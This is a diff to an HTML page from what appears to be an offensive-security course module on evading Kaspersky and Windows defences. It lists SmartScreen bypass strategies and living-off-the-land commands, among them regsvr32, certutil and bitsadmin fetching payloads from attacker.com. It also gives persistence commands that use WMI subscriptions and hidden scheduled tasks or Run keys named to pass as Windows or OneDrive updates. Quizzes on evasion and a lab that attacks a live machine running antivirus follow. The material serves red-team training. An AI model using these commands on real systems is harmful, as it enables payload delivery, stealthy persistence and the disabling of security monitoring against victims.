+  <h3>Windows SmartScreen Bypass</h3>
+  <p>SmartScreen is Windows' built-in reputation filter. It blocks unknown executables with a warning dialog.</p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>// SmartScreen checks:
+// 1. Is the file signed by a trusted CA? → Pass
+// 2. Is the file prevalent (1000+ systems)? → Pass
+// 3. Is the URL reputation good? → Pass
+// 4. Has the user run this file before? → Pass
+// 5. Otherwise → BLOCK with warning
+
+// Bypass strategies:
+// - Sign the file (even self-signed reduces warning frequency)
+// - Distribute from a known-good domain (GitHub, Dropbox)
+// - Use an installer (MSI) instead of raw EXE
+// - Embed in a signed document (macro, OLE object)
+// - Use LOLBAS techniques (see Section 11)</pre>
+  </div>
+
+  <!-- SECTION 11: LIVING OFF THE LAND -->
+  <h2 id="lotl">11. Living Off The Land (LOTL)</h2>
+
+  <p>The ultimate evasion technique is to <span class="neon-highlight">not bring any tools at all</span>. Use the operating system's own binaries, scripts, and features to achieve your goals. If you never drop a malicious file, there is nothing for the AV to detect.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>Living off the land is like a burglar who never brings their own tools. They use the homeowner's screwdriver, the kitchen knife, and the garage ladder. When the police investigate, they find only the victim's own belongings — no evidence of an intruder.</p>
+  </div>
+
+  <h3>LOTL Binaries (LOLBAS Project)</h3>
+  <p>The <a href="https://lolbas-project.github.io/" target="_blank">LOLBAS project</a> catalogs Windows binaries that can be used for malicious purposes. Here are the most useful for AV evasion:</p>
+
+  <div class="lotl-grid">
+    <div class="lotl-card">
+      <h5>regsvr32.exe</h5>
+      <p class="binary">regsvr32 /s /n /u /i:http://attacker.com/shell.sct scrobj.dll</p>
+      <p>Executes remote scriptlets without touching disk. No PowerShell, no cmd.exe. AV often whitelists regsvr32 as a system binary.</p>
+    </div>
+    <div class="lotl-card">
+      <h5>mshta.exe</h5>
+      <p class="binary">mshta javascript:alert("test")</p>
+      <p>Executes HTML Applications (HTA) containing JavaScript or VBScript. Can download and execute remote payloads.</p>
+    </div>
+    <div class="lotl-card">
+      <h5>certutil.exe</h5>
+      <p class="binary">certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe</p>
+      <p>Downloads files from remote URLs. Also decodes Base64: <code>certutil -decode encoded.txt decoded.exe</code>. Whitelisted as a system utility.</p>
+    </div>
+    <div class="lotl-card">
+      <h5>bitsadmin.exe</h5>
+      <p class="binary">bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe</p>
+      <p>Background Intelligent Transfer Service. Downloads files using Windows Update's network protocol. Often bypasses firewall rules.</p>
+    </div>
+    <div class="lotl-card">
+      <h5>powershell.exe</h5>
+      <p class="binary">powershell -enc [Base64EncodedCommand]</p>
+      <p>The classic LOTL tool. Encoded commands bypass simple string matching. See <a class="cross-link" href="MODULE_11_AMSI_BYPASS.html">Module 11</a> for AMSI bypass techniques.</p>
+    </div>
+    <div class="lotl-card">
+      <h5>rundll32.exe</h5>
+      <p class="binary">rundll32.exe javascript:"..mshtml,RunHTMLApplication";alert("test")</p>
+      <p>Executes JavaScript via DLL entry point. No file needed — everything is in the command line.</p>
+    </div>
+    <div class="lotl-card">
+      <h5>wmic.exe</h5>
+      <p class="binary">wmic process call create "powershell -enc ..."</p>
+      <p>Windows Management Instrumentation. Can execute commands, download files, and modify system settings. Deprecated but still present.</p>
+    </div>
+    <div class="lotl-card">
+      <h5>cmstp.exe</h5>
+      <p class="binary">cmstp /s malicious.inf</p>
+      <p>Connection Manager Profile Installer. Bypasses AppLocker and executes arbitrary code via INF files. Signed by Microsoft.</p>
+    </div>
+  </div>
+
+  <h3>LOTL Scripting</h3>
+  <p>Beyond binaries, Windows includes powerful scripting engines that AV often ignores:</p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>// VBScript execution via wscript/cscript
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell -enc [Base64]", 0, False
+
+// JScript execution
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run("cmd /c whoami", 0, false);
+
+// Windows Script Host (WSH) is often unmonitored
+// Many AV engines focus on PowerShell but ignore .vbs and .js files</pre>
+  </div>
+
+  <h3>LOTL Persistence</h3>
+  <p>Use legitimate Windows features for persistence — no malware needed:</p>
+
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>// WMI Event Subscription (fileless persistence)
+// Creates a persistent trigger that runs when a specific event occurs
+wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
+
+// Scheduled Task with hidden action
+schtasks /create /tn "WindowsUpdate" /tr "powershell -w hidden -enc [Base64]" /sc onlogon /ru SYSTEM
+
+// Registry Run key via reg.exe (LOTL)
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "OneDriveUpdate" /t REG_SZ /d "powershell -w hidden -c ..." /f</pre>
+  </div>
+
+  <div class="why-box">
+    <h5>🎯 Why LOTL Works</h5>
+    <p>AV vendors cannot block <code>powershell.exe</code>, <code>regsvr32.exe</code>, or <code>certutil.exe</code> without breaking Windows. These are system binaries. The best AV can do is monitor their usage patterns — but if your usage looks normal (e.g., certutil decoding a certificate), there is no detection. LOTL is the <span class="neon-highlight">stealthiest</span> technique because there is no malicious tool to find.</p>
+  </div>
+
+  <!-- SECTION 12: CROSS-LINKS -->
+  <h2 id="crosslinks">12. Cross-Module Links</h2>
+
+  <p>KAV evasion does not exist in isolation. It intersects with nearly every other module in this course. Understanding these connections is essential for building complete attack chains.</p>
+
+  <div class="technique-grid">
+    <div class="method-card">
+      <h4><a class="cross-link" href="MODULE_09_MALWARE.html">Module 09: Malware Development</a></h4>
+      <p>Build the payload that you will later evade detection for. Understanding malware structure (PE headers, imports, sections) is prerequisite to effective evasion.</p>
+    </div>
+    <div class="method-card">
+      <h4><a class="cross-link" href="MODULE_10_CODE_INJECTION.html">Module 10: Code Injection</a></h4>
+      <p>Inject into a trusted process to inherit its reputation. If notepad.exe is trusted, your code inside notepad.exe is trusted. Direct syscalls bypass API hooks used by behavioral detection.</p>
+    </div>
+    <div class="method-card">
+      <h4><a class="cross-link" href="MODULE_11_AMSI_BYPASS.html">Module 11: AMSI Bypass</a></h4>
+      <p>AMSI is the Windows interface that AV uses to scan scripts and memory. Bypassing AMSI blinds the AV's script scanner and behavioral engine. Hardware breakpoint technique (Dark Room) works against both AMSI and ETW.</p>
+    </div>
+    <div class="method-card">
+      <h4><a class="cross-link" href="MODULE_12_ETW_BYPASS.html">Module 12: ETW Bypass</a></h4>
+      <p>ETW provides kernel-level telemetry that AV and EDR consume. Disabling ETW removes the data feed that behavioral detection relies on. Combine with AMSI bypass for complete blindness.</p>
+    </div>
+    <div class="method-card">
+      <h4><a class="cross-link" href="MODULE_14_EDR_EVASION.html">Module 14: EDR Evasion</a></h4>
+      <p>EDR is AV's big brother. It monitors the same behaviors but with more persistence and better analytics. Techniques that evade EDR will almost certainly evade AV, but the reverse is not always true.</p>
+    </div>
+  </div>
+
+  <div class="mitre-mapping">
+    <h5>🗺️ MITRE ATT&CK Mapping</h5>
+    <p>This module covers the following MITRE techniques:</p>
+    <ul style="margin-left: 1.5rem;">
+      <li><code>T1027</code> — Obfuscated Files or Information (packers, crypters)</li>
+      <li><code>T1027.002</code> — Software Packing</li>
+      <li><code>T1027.005</code> — Indicator Removal from Tools</li>
+      <li><code>T1055</code> — Process Injection (see Module 10)</li>
+      <li><code>T1070.004</code> — File Deletion (evidence removal)</li>
+      <li><code>T1218</code> — System Binary Proxy Execution (LOTL)</li>
+      <li><code>T1218.001</code> — Compiled HTML File (hh.exe)</li>
+      <li><code>T1218.004</code> — InstallUtil</li>
+      <li><code>T1218.005</code> — Mshta</li>
+      <li><code>T1218.007</code> — Msiexec</li>
+      <li><code>T1218.010</code> — Regsvr32</li>
+      <li><code>T1218.011</code> — Rundll32</li>
+      <li><code>T1553.002</code> — Code Signing (certificate theft)</li>
+      <li><code>T1562.001</code> — Disable or Modify Tools (AMSI/ETW bypass)</li>
+      <li><code>T1564.003</code> — Hidden Window (sandbox evasion)</li>
+    </ul>
+  </div>
+
+  <!-- SECTION 13: QUIZZES -->
+  <h2 id="quizzes">13. Knowledge Checks</h2>
+
+  <div class="quiz-container">
+    <h3>Quiz 1: Signature Evasion</h3>
+    <p>You have a payload that is detected by Kaspersky's hash signature. Which technique is MOST effective for immediate evasion?</p>
+    <div class="quiz-option" onclick="checkQuiz(this, 'A')">
+      A) Add a single NOP instruction to the payload, changing the file hash
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'B')">
+      B) Compress the payload with UPX
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'C')">
+      C) Change the compiler from MSVC to GCC
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'D')">
+      D) Sign the payload with a self-signed certificate
+    </div>
+    <div class="quiz-feedback" id="quiz1-feedback">
+      <strong>Correct!</strong> A single bit change completely alters the cryptographic hash. Hash signatures are the weakest form of detection. UPX (B) changes the hash too but adds a known packer signature. GCC (C) helps with PE header signatures but not hash signatures. Self-signing (D) does not affect hash-based detection at all.
+    </div>
+  </div>
+
+  <div class="quiz-container">
+    <h3>Quiz 2: Behavioral Detection</h3>
+    <p>Your payload allocates RWX memory using VirtualAlloc. The AV's behavioral engine flags this immediately. What is the most robust evasion technique?</p>
+    <div class="quiz-option" onclick="checkQuiz(this, 'A')">
+      A) Allocate RW memory first, then change to RX with VirtualProtect
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'B')">
+      B) Use direct syscalls to NtAllocateVirtualMemory instead of VirtualAlloc
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'C')">
+      C) Allocate memory in a legitimate process using process injection
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'D')">
+      D) Use HeapAlloc instead of VirtualAlloc
+    </div>
+    <div class="quiz-feedback" id="quiz2-feedback">
+      <strong>Correct!</strong> Direct syscalls (B) bypass user-mode API hooks entirely. The AV hook on VirtualAlloc never fires because you never call it. Option A still triggers VirtualProtect hooks. Option C injects first, which is also monitored. Option D uses a different API but the same underlying behavior (executable memory) is still suspicious.
+    </div>
+  </div>
+
+  <div class="quiz-container">
+    <h3>Quiz 3: Kaspersky System Watcher</h3>
+    <p>You successfully evade Kaspersky's static and behavioral layers. You write a registry Run key for persistence. System Watcher has bRollbackAllowed=1. What happens?</p>
+    <div class="quiz-option" onclick="checkQuiz(this, 'A')">
+      A) System Watcher immediately rolls back the registry change
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'B')">
+      B) System Watcher rolls back only if Kaspersky detects the process as malicious
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'C')">
+      C) System Watcher ignores registry changes entirely
+    </div>
+    <div class="quiz-option" onclick="checkQuiz(this, 'D')">
+      D) System Watcher alerts the user but takes no action
+    </div>
+    <div class="quiz-feedback" id="quiz3-feedback">
+      <strong>Correct!</strong> System Watcher rollback is detection-coupled (B). It only fires when Kaspersky makes a detection and needs to undo changes. If your binary passes static + behavioral scan, there is no detection event — therefore no rollback trigger. The registry key survives. This is a critical insight: evade detection and you automatically evade System Watcher rollback.
+    </div>
+  </div>
+
+  <!-- SECTION 14: LAB EXERCISE -->
+  <h2 id="lab">14. Lab Exercise</h2>
+
+  <div class="lab-exercise">
+    <h3>🎯 Objective</h3>
+    <p>Build a payload that evades Kaspersky on .42 (live target, Kaspersky Premium active).</p>
+    <ol>
+      <li>Build a simple payload (calc.exe spawn or message box)</li>
+      <li>Test 1: Run bare — observe KAV detection method</li>
+      <li>Test 2: XOR obfuscate with key 0xB5 — test again</li>
+      <li>Test 3: Add ghost encoding layer — test again</li>
+      <li>Test 4: Add Dark Room (HWBP on AMSI + ETW) — test again</li>
+      <li>Test 5: Implement persistence (registry Run key) — observe System Watcher rollback</li>
+      <li>Document which layer stopped you and why</li>
+      <li>Compile with GCC not MSVC — verify CLEAN with <code>avp.exe SCAN /i0 /fa</code></li>
+      <li>Test 9: Try a LOTL technique (certutil download + regsvr32 execution) — observe AV reaction</li>
+      <li>Test 10: Combine sandbox evasion checks (sleep, mouse movement, RAM check) with your payload</li>
+    </ol>
+  </div>
 
   <div class="note">
     <strong>Test Environment:</strong> .42 (WUPC AMD desktop) has Kaspersky ACTIVE, KSN ENABLED, System Watcher bRollbackAllowed=1. This is a real target — not a clean VM. .92 (laptop) has Defender stopped and no AV — not a valid test target for Kaspersky evasion.
   </div>
 
+  <div class="warning-box">
+    <h5>⚠️ Safety Rules</h5>
+    <ul style="margin-left: 1.5rem;">
+      <li>Only test on authorized systems (.42 with explicit permission)</li>
+      <li>Do not distribute test payloads outside the lab environment</li>
+      <li>Document all changes for rollback (System Watcher may help here)</li>
+      <li>Never test KSN evasion with live malware — use benign payloads only</li>
+      <li>Report any unexpected KSN submissions to the course instructor</li>
+    </ul>
+  </div>
+
+  <h2>Interactive Demo</h2>
+  <p>Real data from .42 (AMD desktop, Kaspersky Premium 21.25.7.504 active) — live AV processes, defense layers, and evasion techniques:</p>
+  <iframe class="widget-iframe" src="../widgets/module_13_widget.html" title="Module 13 Kaspersky Evasion Interactive Demo" style="width:100%; height:600px; border:1px solid #333; border-radius:8px; margin:20px 0; background:#111;"></iframe>
+
   <div class="nav">
     <a href="MODULE_12_ETW_BYPASS.html">← Module 12: ETW Bypass</a>
-    <a href="MODULE_14_CLOUD_FILES.html">Module 14: Cloud Files Internals →</a>
+    <a href="MODULE_14_EDR_EVASION.html">Module 14: EDR Evasion →</a>
   </div>
 </div>
+
+<script>
+function copyCode(btn) {
+    const codeBlock = btn.parentElement.querySelector('pre');
+    const text = codeBlock.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'COPIED!';
+        setTimeout(() => btn.textContent = 'COPY', 2000);
+    });
+}
+
+function checkQuiz(element, correctAnswer) {
+    const container = element.parentElement;
+    const options = container.querySelectorAll('.quiz-option');
+    const feedback = container.querySelector('.quiz-feedback');
+    
+    options.forEach(opt => {
+        opt.style.pointerEvents = 'none';
+        const answer = opt.getAttribute('onclick').match(/'(\w)'/)[1];
+        if (answer === correctAnswer) {
+            opt.classList.add('correct');
+        } else if (opt === element) {
+            opt.classList.add('wrong');
+        }
+    });
+    
+    feedback.classList.add('show');
+    if (element.getAttribute('onclick').includes("'" + correctAnswer + "'")) {
+        feedback.classList.add('correct');
+        feedback.classList.remove('wrong');
+    } else {
+        feedback.classList.add('wrong');
+        feedback.classList.remove('correct');
+    }
+}
+</script>
 
 </body>
 </html>
